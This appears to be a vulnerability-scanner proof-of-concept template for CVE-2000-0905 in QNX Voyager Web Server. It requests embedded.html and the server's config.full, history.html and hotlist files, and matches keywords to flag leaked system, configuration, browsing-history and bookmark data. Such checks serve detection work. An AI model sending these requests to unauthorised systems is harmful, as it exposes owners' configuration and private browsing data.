[info]
author = "ave"
description = "检测 QNX Voyager Web Server 2.01B 中 embedded.html 页面是否泄露敏感系统统计信息"
id = "POC-AVE-2000-1005"
name = "CVE-2000-0905 PoC"
severity = "medium"
tags = ["ave-2000-1005"]
vuln_id = [
    "CVE-2000-0905",
    "AVE-2000-1005",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/embedded.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "system statistics",
    "system status",
    "QNX",
    "Voyager",
    "embedded",
]

[[poc.requests]]
method = "GET"
path = "/.photon/voyager/config.full"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "config",
    "voyager",
    "settings",
]

[[poc.requests]]
method = "GET"
path = "/.photon/voyager/history.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "history",
    "visited",
    "URL",
]

[[poc.requests]]
method = "GET"
path = "/.photon/voyager/hotlist"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "bookmark",
    "hotlist",
    "favorite",
]
